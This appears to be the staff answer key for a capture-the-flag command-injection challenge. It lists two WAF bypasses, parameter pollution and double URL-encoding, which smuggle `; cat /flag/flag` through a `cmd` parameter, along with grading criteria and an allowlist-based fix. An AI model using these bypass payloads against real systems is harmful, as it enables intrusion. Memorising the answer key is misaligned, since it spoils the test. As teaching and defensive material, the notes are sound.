# inj14 (GateKeeper) — intended solution & staff notes

## Path (either door)
1. **HPP door (primary):** `GET /run?cmd=ls&cmd=ls%3b+cat+/flag/flag`.
   The WAF inspects the first `cmd` value (`ls` — clean). The app routes on
   the last value, percent-decodes it (`ls%3b cat ...` → `ls; cat ...`) and
   runs it. (A bare `; ...` would be a shell syntax error — the separator
   needs a command in front of it.)
2. **Double-encoding door:** `GET /run?cmd=ls%253b+cat+/flag/flag`.
   The framework decodes once (`ls%253b ...` → `ls%3b ...`) — the WAF sees
   no literal metacharacter. The app decodes again (`%3b` → `;`) and
   executes `ls; cat /flag/flag`.

Sanity check first: `GET /run?cmd=ls%3b+cat+/flag/flag` (single-encoded,
one param) must come back `403 WAF: request blocked` — that is the control
showing the WAF works on the naive path.

## Why allowlisting beats metacharacter blocking
The WAF here does what most do: a blacklist of shell metacharacters, applied
to one view of the request. Blacklists fail by construction the moment the
attacker and the defender disagree on *which bytes count* — encoding depth
(double-decode), parameter multiplicity (HPP), case, unicode, chunked
splitting, header-vs-body. The app's real contract is "run one of a known
set of diagnostics"; the fix is to check the value against that allowlist
(`ls`, `df`, `uptime`, ... with fixed argument shapes) and pass it as an
argument vector — no shell, no metacharacter surface, nothing to encode
around. A WAF can still sit in front, but it is defense-in-depth, not the
control.

## Grading discriminators
- Gets the 403 on the naive payload first (understands what is being
  evaded), then evades.
- Distinguishes the two doors (encoding depth vs parameter multiplicity)
  rather than treating them as one trick.
- Names the fix as allowlisting + no shell, not "better WAF rules".

## Fix
- Allowlist `cmd` against the diagnostic set; validate argument shapes.
- `execve` with an argument vector (no `sh -c`).
- If a WAF remains: one canonical decode for WAF and app (same view), and
  reject (not skip) requests with duplicate parameters.
